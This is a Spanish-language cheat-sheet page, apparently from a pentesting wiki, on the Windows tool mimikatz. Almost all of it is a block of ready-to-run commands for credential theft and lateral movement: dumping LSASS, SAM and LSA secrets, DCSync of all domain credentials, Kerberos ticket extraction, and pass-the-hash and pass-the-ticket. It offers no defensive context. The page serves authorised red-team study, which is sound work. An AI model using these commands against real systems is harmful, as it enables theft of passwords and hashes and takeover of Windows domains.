---
title: mimikatz
resumen: Herramienta clásica para Windows: extrae contraseñas, tickets Kerberos, hashes NTLM y certificados.
tags: swiss-army-knife
---

Herramienta para Windows que permite extraer las contraseñas de inicio de sesión, tickets de Kerberos, hashes NTLM y certificados directamente de memoria (LSASS) o de las bases de datos locales.

> Antes de nada, comprobar privilegios: `privilege::debug`

```powershell
# Comprobar privilegios
privilege::debug

# (Over) Pass The Hash
sekurlsa::pth /user:<Usuario> /ntlm:<HASH> /domain:<DominioFQDN>

# Listar todos los tickets Kerberos disponibles en memoria
sekurlsa::tickets

# Volcar credenciales de Terminal Services locales
sekurlsa::tspkg

# Volcar y guardar LSASS en un fichero
sekurlsa::minidump c:\temp\lsass.dmp

# Listar MasterKeys en caché
sekurlsa::dpapi

# Listar claves AES de Kerberos locales
sekurlsa::ekeys

# Dump de la base de datos SAM
lsadump::sam

# Dump de la base de datos SECRETS
lsadump::secrets

# Inyectar y dumpear las credenciales del Domain Controller
privilege::debug
token::elevate
lsadump::lsa /inject

# Dump de las credenciales del dominio sin tocar el LSASS del DC (remoto) - DCSync
lsadump::dcsync /domain:<DominioFQDN> /all

# Listar y dumpear credenciales Kerberos locales
kerberos::list /dump

# Pass the Ticket
kerberos::ptt <RutaAlTicketKirbi>

# Listar sesiones TS/RDP
ts::sessions

# Listar credenciales de Vault
vault::list
```

### Técnicas donde aparece

[[dcsync]] · [[dump-credenciales-locales]] · [[pass-the-hash]] · [[pass-the-ticket]] · [[golden-ticket]] · [[silver-ticket]]
